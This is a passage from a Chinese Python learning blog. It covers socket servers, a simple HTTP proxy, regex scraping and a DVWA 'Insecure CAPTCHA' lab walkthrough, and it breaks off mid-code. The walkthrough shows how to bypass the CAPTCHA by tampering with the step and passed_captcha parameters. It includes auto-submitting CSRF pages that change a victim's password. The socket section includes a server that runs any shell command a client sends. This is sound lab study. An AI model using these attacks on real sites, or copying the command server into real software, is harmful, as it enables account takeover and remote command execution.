socketserver.ThreadingTCPServer(('',6666),MyTCPServer) server.serve_forever() 可以看出，对比与socket库，我们简化了初始socket，绑定端口ip，开始监听的过程，只需要去规定发送与接收信息的流程，并且支持多线程，短短几行代码就可以实现我们之前通过复杂的代码实现的效果 下面附上一个简单的Server端和Client端的实例： Server端： 123456789101112131415161718192021import socketserverclass MyTCPServer(socketserver.BaseRequestHandler): def handle(self): print('Connected By',self.client_address) self.request.send(str.encode('Welcome to TCPServer!')) while True: self.data = self.request.recv(1024) self.data = bytes.decode(self.data) if(self.data == 'exit'): print('Client',self.client_address,'has lost') break print('The data from',self.client_address,'is',self.data) self.reply = input('reply to client: ') self.request.send(str.encode(self.reply))if __name__=='__main__': HOST = 'localhost' PORT = 6666 server = socketserver.ThreadingTCPServer((HOST,PORT),MyTCPServer) server.serve_forever() Client端： 123456789101112131415from socket import *c = socket(AF_INET,SOCK_STREAM)c.connect(('127.0.0.1',6666))message = c.recv(1024)print(bytes.decode(message))while True: data = input('data: ') if data == 'exit': c.send(str.encode(data)) break c.send(str.encode(data)) reply = c.recv(1024) print('The reply from TCPServer is',bytes.decode(reply))c.close() 模拟burp抓取http包想必大家都用过burp，它相当于一个我们使用的客户端与要访问的服务器之间的一个代理，我们要发送到服务器的http请求报文都会通过burp，被burp拦截下来，然后burp可以分析我们发送的http请求包头 在学习了socket后，我们可以试着模拟一下代理的过程，首先我们先试着抓取http请求 代码如下： 12345678910from socket import *s = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',8080))s.listen(5)sock,addr = s.accept()header = bytes.decode(sock.recv(1024))print(header)sock.close()s.close() 代码很简单，就是利用socket库的基本方法，这里监听的是本地的8080端口，也就是说我们设置浏览器的代理地址是127.0.0.1，端口是8080 接下来启动程序，在浏览器中输入网址，监听到http包头 然后我们要想办法获取访问的主机名，这里利用正则匹配获得 123import rematch = re.search(r'Host:\\s(.*)\\s',http)CHOST = match.group(1) 获取了访问的主机名，我们就可以连接至访问主机，然后将http包头发送给目标主机，再将目标主机返回的信息发回给本地主机，就可以实现代理了，代码如下： 123456789101112131415161718192021222324252627282930313233import socketserverimport refrom socket import *def getHost(http): match = re.search(r'Host:\\s(.*)\\s',http) CHOST = match.group(1) return CHOSTclass MyProxy(socketserver.BaseRequestHandler): def handle(self): self.http = self.request.recv(1024) self.http = bytes.decode(self.http) print(self.http) self.CHOST = getHost(self.http) c = socket(AF_INET,SOCK_STREAM) c.connect((self.CHOST,80)) c.send(str.encode(http)) response = [] while True: data = c.recv(1024) if data: response.append(data) else: break self.response = ''.join(response) self.sendall(self.response) if __name__=='__main__': LHOST = 'localhost' LPORT = 8080 server = socketserver.ThreadingTCPServer((LHOST,LPORT),MyProxy) server.serve_forever() 这个程序实践过程中很明显的会出现很多不可预料的错误，要解决这些只能更详细的学习代理的协议，但是简单的思路还是没错的","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"Python网络编程(一)","slug":"Python网络编程(一)","date":"2018-07-22T08:00:00.000Z","updated":"2018-07-23T03:56:44.075Z","comments":true,"path":"/posts/41404/","link":"","permalink":"https://Foxgrin.github.io/posts/41404/","excerpt":"Socket是网络编程的一个非常重要的基础，而Python的Socket标准库也提供了非常完善且易用的语法，这篇文章简单介绍一下Socket库的基本用法，以及结合os标准库，threading多线程库实现远程SSH通信，最后模拟TCP代理交互的过程","text":"Socket是网络编程的一个非常重要的基础，而Python的Socket标准库也提供了非常完善且易用的语法，这篇文章简单介绍一下Socket库的基本用法，以及结合os标准库，threading多线程库实现远程SSH通信，最后模拟TCP代理交互的过程 Socket库基本用法Socket是任何一种计算机网络通讯最基础的内容，例如当你在浏览器地址栏中输入一个网址时，你就会打开一个套接字，任何连接到指定的网址并读取响应的页面然后显示出来，在Python中使用Socket库进行通信的对象无非就是两个，一个是服务器端，一个是客户端 服务器端的主要流程： (1)初始化socket()，创建套接字 12import sockets = socket.socket(AF_INET,SOCK_STREAM) 这里socket函数是初始化socket，里面的参数默认是AF_INET和SOCK_STREAM (2)使用bind()绑定服务器端的ip和端口 1s.bind(('127.0.0.1',6666)) 这里注意传入的参数是一个元组，包含了ip地址和端口号 (3)使用listen()监听消息 1s.listen(5) 这里的参数最大值为5 (4)使用accept()获取客户端的套接字地址 1sock,addr = s.accept() 这个函数有点类似input函数，input函数是等待用户输入才会执行下一步，而accept函数则等待用户的连接才执行下一步，返回也是一个元组(conn,address)，其中conn是新的套接字对象，可以用来接收和发送数据，address是连接的客户端地址 (5)使用recv()接收数据，send()发送数据与客户端进行交互 12text = sock.recv(1024)sock.send(data) 这里要注意的是在Python 3中send()中的参数必须是字节类型 客户端的主要流程： (1)初始化socket()，创建套接字 1c = socket.socket(AF_INET,SOCK_STREAM) (2)使用connect()指定连接的ip和端口号连接至指定服务器端 1c.connect(('127.0.0.1',6666)) 同样的，参数必须是元组，包括要连接的服务器的ip地址和端口号 (3)使用recv()接收数据，send()发送数据与服务器端进行交互 12text = c.recv(1024)c.send(data) 其实使用socket库其实就只需要注意send()与recv()需要对应起来，不然可能导致客户端或者服务器端处于挂起的状态 下面我们就来看一个简单的服务器端和客户端的一个例子 Server(服务器端) 123456789101112131415from socket import *s=socket(AF_INET,SOCK_STREAM) #初始化socket，创建套接字s.bind(('localhost',6666)) #绑定服务器ip地址和端口s.listen(5) #开始监听while True: sock,addr=s.accept() #等待客户端连接，获取客户端套接字地址 print('Connected By',addr) sock.send(str.encode('Welcome to Server!')) #向客户端发送数据 while True: data=sock.recv(1024) #接收客户端发送的数据 print(bytes.decode(data)) if not data: print('Client has lost') break Client(客户端) 12345678910from socket import *c=socket(AF_INET,SOCK_STREAM) #初始化套接字c.connect(('127.0.0.1',6666)) #连接服务器text=c.recv(1024)print(bytes.decode(text))for i in range(10): data=input() c.send(str.encode(data))c.close() 服务器端使用了死循环以保持一直处于监听状态，客户端发送10次信息与服务器端断开连接，之后服务器继续等待客户端连接，这个程序缺点是服务器端只能支持一个客户端连入，不能支持多个客户端同时连入 os库基本用法Python的os库提供了各种操作系统功能的接口，通过例子简单说明一下几种常用的函数 123456789101112131415import oscmd = input('Please input a command: ')a = os.system(cmd) #执行shell命令print(a) #返回值为0cmd = input('Please input a command: ')a = os.popen(cmd) #返回一个对象print(a.read())print(os.getcwd()) #获取当前目录print(os.listdir(os.getcwd())) #返回指定文件夹下包含的文件或文件夹的名字的列表os.chdir(os.getcwd()+'/test') #到达指定目录下os.system('test.py') 下面通过os库与socket库结合模拟SSH通信 服务器端： 123456789101112131415161718from socket import *import oss = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',6666))s.listen(5)while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to the SSHServer!')) while True: cmd = sock.recv(1024) cmd = bytes.decode(cmd) if cmd == 'exit': print('Client has lost') break result = os.popen(cmd).read() sock.send(str.encode(result)) 客户端： 123456789101112131415from socket import *import osc = socket(AF_INET,SOCK_STREAM)c.connect(('127.0.0.1',6666))text = c.recv(1024)print(bytes.decode(text))while True: cmd = input('Please input a command: ') c.send(str.encode(cmd)) if cmd == 'exit': c.close() break result = c.recv(1024) print(bytes.decode(result)) 当客户端输入exit时，断开与服务器的连接。同样的，这里的服务器端还是只能与一个客户端连接 利用threading库实现多线程连接服务器端： 12345678910111213141516171819202122232425from socket import *from threading import Threadfrom time import sleepimport osdef ThreadHandle(sock,addr): while True: cmd = sock.recv(1024) cmd = bytes.decode(cmd) if cmd == 'exit': print(addr,'has lost') break result = os.popen(cmd).read() sock.send(str.encode(result))s = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',6666))s.listen(5)while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to SSHServer!')) t = Thread(target=ThreadHandle,args=(sock,addr)) sleep(0.1) t.start() 客户端： 123456789101112131415from socket import *import osc = socket(AF_INET,SOCK_STREAM)c.connect(('127.0.0.1',6666))text = c.recv(1024)print(bytes.decode(text))while True: cmd = input('Please input a command: ') c.send(str.encode(cmd)) if cmd == 'exit': c.close() break result = c.recv(1024) print(bytes.decode(result)) 服务器端使用了threading标准库的Thread函数开启了多线程，即每个连接都是一个单独的进程 模拟TCP代理我们假设服务器与客户端因为某种原因不能直接通信，这时候就需要一个中间的代理将客户端的信息转发到服务器，再接收服务器返回的数据再转发给客户端，这就是代理的原理 如果我们把Python中一个socket代表一个连接，那么代理既要与客户端连接又要与服务器连接，就需要两个socket 我们先来编写服务器端和客户端，跟前面的例子一样，不说明了 服务器端： 1234567891011121314151617from socket import *import oss = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',6666))s.listen(5)while True: sock,addr = s.accept() print('Connected By',addr) while True: cmd = sock.recv(1024) cmd = bytes.decode(cmd) if cmd == 'exit': print('TCPClient has lost') break result = os.popen(cmd).read() sock.send(str.encode(result)) 客户端： 12345678910111213141516171819from socket import *HOST = '127.0.0.1'PORT = input('Please input a PORT to connect: ')PORT = int(PORT)c = socket(AF_INET,SOCK_STREAM)c.connect((HOST,PORT))text = c.recv(1024)print(bytes.decode(text))while True: cmd = input('Please input a command: ') c.send(str.encode(cmd)) if cmd == 'exit': c.close() break result = c.recv(1024) result = bytes.decode(result) print(result) 接下来开始编写代理，首先我们先定义建立与客户端连接的socket的函数 1234567891011121314151617181920def Server(LPORT,CHOST,CPORT): c = Client(CHOST,CPORT) s = socket(AF_INET,SOCK_STREAM) s.bind(('localhost',LPORT)) s.listen(5) while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to TCPProxy!')) while True: cmd = sock.recv(1024) if bytes.decode(cmd) == 'exit': print('TCPClient '+addr+' has lost') Forward(c,cmd) c.close() break print('The command from TCPClient is: '+bytes.decode(cmd)) result = Forward(c,cmd) print('The result from TCPServer is: '+bytes.decode(result)) sock.send(result) 因为代理是接收客户端的数据再将数据转发至服务器，再把服务器返回的结果转发到客户端。所以我们不妨把代理看成是客户端的服务器，因此定义函数名为Server，等待客户端的连接，虽然它不然处理客户端发来的数据，但是它可以将数据转发服务器端让服务器端代为处理，这里的参数LPORT是代理绑定的端口号，CHOST和CPORT是传入Client函数的参数，也就是后面讲代理看作是客户端与服务器端连接。 与客户端建立连接后，接收客户端的数据打印出来后，将数据通过Forward函数转发至服务器端，当客户端输入exit命令时，代理将断开与服务器端的连接和客户端的连接并继续等待客户端的接入 接下来编写与服务器端连接的函数Client和转发数据的函数Forward 1234def Client(CHOST,CPORT): c = socket(AF_INET,SOCK_STREAM) c.connect((CHOST,CPORT)) return c 1234def Forward(c,cmd): c.send(cmd) result = c.recv(1024) return result 参数CHOST和CPORT是服务器端的IP和端口 再编写主函数： 12345678def main(): try: LPORT = int(sys.argv[1]) CHOST = sys.argv[2] CPORT = int(sys.argv[3]) Server(LPORT,CHOST,CPORT) except: usage() 这里用到了sys标准库的sys.argv[]，简单地说就是我们在cmd中输入执行python程序时获取的参数，假如我们在cmd命令行中输入test.py aaa bbb，那么sys.argv[0]就代表了字符串’test.py’，sys.argv[1]代表了字符串’aaa’，同理sys.argv[2]代表了字符串’bbb’，所以我们要执行这个代理的程序，不仅要输入python程序的文件名，还要同时输入三个参数，否则就出错而执行usage函数，我们就定义usage函数为这个程序的用法 12def usage(): print('TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]') 说明了执行这个代理程序应当输入的格式 下面附上代理端完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from socket import *import sysdef usage(): print('TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]')def Server(LPORT,CHOST,CPORT): c = Client(CHOST,CPORT) s = socket(AF_INET,SOCK_STREAM) s.bind(('localhost',LPORT)) s.listen(5) while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to TCPProxy!')) while True: cmd = sock.recv(1024) if bytes.decode(cmd) == 'exit': print('TCPClient '+addr+' has lost') Forward(c,cmd) c.close() break print('The command from TCPClient is: '+bytes.decode(cmd)) result = Forward(c,cmd) print('The result from TCPServer is: '+bytes.decode(result)) sock.send(result)def Client(CHOST,CPORT): c = socket(AF_INET,SOCK_STREAM) c.connect((CHOST,CPORT)) return cdef Forward(c,cmd): c.send(cmd) result = c.recv(1024) return resultdef main(): try: LPORT = int(sys.argv[1]) CHOST = sys.argv[2] CPORT = int(sys.argv[3]) Server(LPORT,CHOST,CPORT) except: usage()main()","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"Python正则表达式","slug":"Python正则表达式","date":"2018-07-21T06:53:00.000Z","updated":"2018-07-21T14:22:28.172Z","comments":true,"path":"/posts/26030/","link":"","permalink":"https://Foxgrin.github.io/posts/26030/","excerpt":"好久没复习Python了，感觉很多东西都快忘了，趁着假期赶紧补一补基础","text":"好久没复习Python了，感觉很多东西都快忘了，趁着假期赶紧补一补基础 什么是正则正则表达式使用单个字符串来描述，匹配一系列符合某个句法规则的字符串，简单理解，就是对字符串的检索匹配和处理 Python 正则表达式Python通过re模块提供对正则表达式的支持 1.先将正则表达式的字符串形式编译为Pattern实例； 2.使用Pattern实例处理文本并获得匹配结果； 3.使用实例获得信息，进行其他的操作。 先熟知几个re模块常用的函数： (1)re.compile(pattern,flags=0) ​ re.match(pattern,string,flags=0) 来看下面一个例子： 12345&gt;&gt;&gt; import re&gt;&gt;&gt; pattern = re.compile('hello')&gt;&gt;&gt; match = pattern.match('hello world')&gt;&gt;&gt; print(match.group())hello 这个例子使用了re模块的compile函数生成一个正则表达式的pattern对象，该对象拥有一系列方法用于正则表达式的匹配和替换,简单而言就是规定了匹配的模式，而match函数则用来匹配，匹配成功则返回一个match对象，match对象通过group()返回被RE匹配的字符串 (2)re.findall(pattern,string,flags=0) 来看下面一个例子： 123&gt;&gt;&gt; import re&gt;&gt;&gt; re.findall('hello','hello world')['hello'] 这个例子使用了re模块的findall函数遍历匹配，可以获取字符串中所有匹配的字符串，返回一个列表，跟compile函数不同在于，findall函数能搜素出所有符合的字符串组成一个列表 (3)re.search(pattern,string,flags=0) 来看下面一个例子： 1234&gt;&gt;&gt; import re&gt;&gt;&gt; match = re.search('hello','hello world')&gt;&gt;&gt; match.group()'hello' 这个例子使用了re模块的search函数，跟match函数一样，只找到第一个匹配的字符串然后返回一个match对象 实例抓取i春秋网页的课程信息 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsimport refrom bs4 import BeautifulSoupurl=\"https://www.ichunqiu.com/courses/webaq\"header=&#123; 'Host': 'www.ichunqiu.com', 'Connection': 'close', 'Cache-Control': 'max-age=0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36', 'Upgrade-Insecure-Requests': '1', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9' &#125;r=requests.get(url,headers=header)r.encoding=r.apparent_encodingsoup=BeautifulSoup(r.text,'html.parser')#获取课程名称classname=[]l=soup.find_all('div',class_='coursename')for i in l: classname.append(i['title'])#获取课程价格cost=re.findall(r'\\d*元|免费',str(soup))#获取课程课时和总时间time=re.findall(r'\\d*课时\\d*分钟',str(soup))#获取课程学习人数people=re.findall(r'\\d*人学习',str(soup))#整理课程所有信息classMessage=[]message=[]for i in range(20): message.append(classname[i]) message.append(cost[i]) message.append(time[i]) message.append(people[i]) classMessage.append(message) message=[]print('&#123;0:30s&#125;\\t&#123;1:8s&#125;\\t&#123;2:15s&#125;\\t&#123;3:15s&#125;'.format('课程名称','价格','课时及总时间','学习人数',chr(12288)))for i in classMessage: print('&#123;0:30s&#125;\\t&#123;1:8s&#125;\\t&#123;2:15s&#125;\\t&#123;3:15s&#125;'.format(i[0],i[1],i[2],i[3],chr(12288))) print() 输出结果： 最后这里因为中文英文字符所占字节不同，所以死活对不齐…也利用了chr(12288)填充的办法还是行不通，希望有大神能告知如何解决，感激不尽 特殊字符 一般字符 匹配自身 abc abc . 匹配任意换行符”\\n”以外的字符 a.c abc \\ 转义字符，是最后一个字符改变原来的意思。用于在正则表达式中转义一些特殊字符 a\\.c a\\\\c a.c a\\c […] 字符集。对应的位置可以是字符串集中任意1个字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]，第一个字符如果是^则表示取反，如[^abc]表示不是abc的其他字符。所有的特殊字符在字符集中都失去原来的特殊含义，在字符集中如果要使用]，-或^，可以在前面加上反斜杠 a[bcd]e abe ace ade 字符集 预定义字符（可以写在[…]中） 含义 例子 符合匹配的例子 \\d 数字：[0-9] a\\dc a1c,a9c \\D 非数字：[^\\d] a\\Dc abc,a c \\s 空白字符：[&lt;空格&gt;\\t\\r\\f\\v] a\\sc a c \\S 非空白字符：[^\\s] a\\Sc abc,a1c \\w 单词字符：[A-Za-z0-9] a\\wc abc,a1c,aBc \\W 非单词字符：[^\\w] a\\Wc a c,a.c 数量词 数量词 含义 例子 符合匹配的例子 * 匹配前一次字符0次或无限次 abc* ab,abccc + 匹配前一个字符1次或无限次 abc+ abc,abccc ? 匹配前一个字符0次或1次 abc? ab,abc {m} 匹配前一个字符m次 ab{2}c abbc {m,n} 匹配前一个字符m到n次 ab{1,2}c abc,abbc 逻辑，分组 字符 含义 例子 符合匹配的例子 或运算符 代表左右表达式任意匹配一个，它总是先尝试匹配左边的表达式，一旦成功匹配则跳过右边的表达式，如果或运算符没有包括在()中，则它的范围是整个正则表达式 abc或def abc def (…) 被括起来的表达式将作为分组，从表达式左边开始每遇到一个分组的左括号，编号+1分组表达式作为一个整体，可以后接数量词，表达式中或运算符仅在该组中有效 (abc){2} a(123或456)c abcabc a123c,a456c 贪婪模式和非贪婪模式正则表达式通常用于在文本中查找匹配的字符串。Python里的数量词默认是贪婪的，意思是总是尝试匹配尽可能多的字符；非贪婪的则相反，总是尝试匹配尽可能少的字符。 例如：正则表达式”ab*“如果用于查找”abbbc”，将匹配到”abbb”。而如果使用非贪婪方法(在数量词后面加上?，则使用非贪婪方法匹配)，如”ab*?”，将找到”a”","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"dvwa-Insecure CAPTCHA","slug":"dvwa-Insecure CAPTCHA","date":"2018-07-16T06:10:00.000Z","updated":"2018-07-16T08:02:16.296Z","comments":true,"path":"/posts/51335/","link":"","permalink":"https://Foxgrin.github.io/posts/51335/","excerpt":"总结了dvwa中关于不安全的验证码的关卡","text":"总结了dvwa中关于不安全的验证码的关卡 Low代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_SERVER[ &apos;REMOTE_ADDR&apos; ], $_POST[ &apos;recaptcha_challenge_field&apos; ], $_POST[ &apos;recaptcha_response_field&apos; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) &#123; // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; else &#123; // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) &#123; // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;&#123;$pass_new&#125;\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;&#123;$pass_conf&#125;\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; &#125; else &#123; // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; &#125; if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // Check to see if both password match if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; mysql_close(); &#125; ?&gt; 代码很长，但是我们并不需要所有的代码，关键代码在于服务器的两个执行流程，首先会使用Google提供reCAPTCHA服务，这个服务会产生一个验证码(PS:访问到这个验证码需要翻墙，这里没有翻墙，所以显示不出验证码，但不影响我们的测试)，待用户输入验证码之后调用一个recaptcha_check_answer函数检查用户输入的正确性，该函数具体语法如下： recaptcha_check_answer($privkey,$remoteip, $challenge,$response) 参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：$is_valid是布尔型的，表示校验是否有效，$error是返回的错误代码。 若校验成功，服务器会返回一个修改密码的表单，待用户修改密码 那么就有个疑问，是不是一定要通过输入正确的验证码才能修改得了密码呢，服务器的意思虽然是这样，但是我们仔细观察源代码，发现了一个很关键的参数$_POST[‘step’]，服务器只是根据这个参数的值来分别执行校验和修改密码的两个流程，说到这里，就很明白了，我们只需要修改step的值为2，就能轻松的跳过校验过程，所以说这个验证码是不安全的，或者说这是一个不安全的校验过程 我们利用burp抓包修改step值 成功修改密码为admin 还可以利用CSRF攻击的原理诱骗受害者访问一个攻击页面，攻击页面伪造请求给服务器修改密码 攻击页面代码如下： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 受害者访问攻击页面，最终跳转到修改密码成功的页面，缺点就是会被受害者察觉到密码被修改了 Medium代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?php if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], $_SERVER[ 'REMOTE_ADDR' ], $_POST[ 'recaptcha_challenge_field' ], $_POST[ 'recaptcha_response_field' ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) &#123; // What happens when the CAPTCHA was entered incorrectly $html .= \"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;\"; $hide_form = false; return; &#125; else &#123; // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) &#123; // Show next stage for the user echo \" &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\\"#\\\" method=\\\"POST\\\"&gt; &lt;input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"&#123;$pass_new&#125;\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"&#123;$pass_conf&#125;\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"passed_captcha\\\" value=\\\"true\\\" /&gt; &lt;input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" /&gt; &lt;/form&gt;\"; &#125; else &#123; // Both new passwords do not match. $html .= \"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;\"; $hide_form = false; &#125; &#125; &#125; if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check to see if they did stage 1 if( !$_POST[ 'passed_captcha' ] ) &#123; $html .= \"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;\"; $hide_form = false; return; &#125; // Check to see if both password match if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the end user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; &#125; else &#123; // Issue with the passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; $hide_form = false; &#125; mysql_close(); &#125; ?&gt; 相较于上一关，这里多了一个对passed_captcha参数的验证，这个参数是通过用户输入正确的验证码后自动提交的一个参数，当然我们也可以利用burp自己构造 老规矩先抓包 修改step参数，并且增加passed_captcha参数 修改密码成功 同样的我们依然可以伪造CSRF攻击页面，代码如下： 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;attack-medium&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&apos;http://127.0.0.1/dvwa/vulnerabilities/captcha/&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;passed_captcha&apos; value=&apos;true&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt; var test=document.getElementById(&apos;transfer&apos;); test.submit();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; High代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpif( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); if ( $resp || ( $_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos; &amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos; ) )&#123; // CAPTCHA was correct. Do both new passwords match? if ($pass_new == $pass_conf) &#123; $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;; $result = 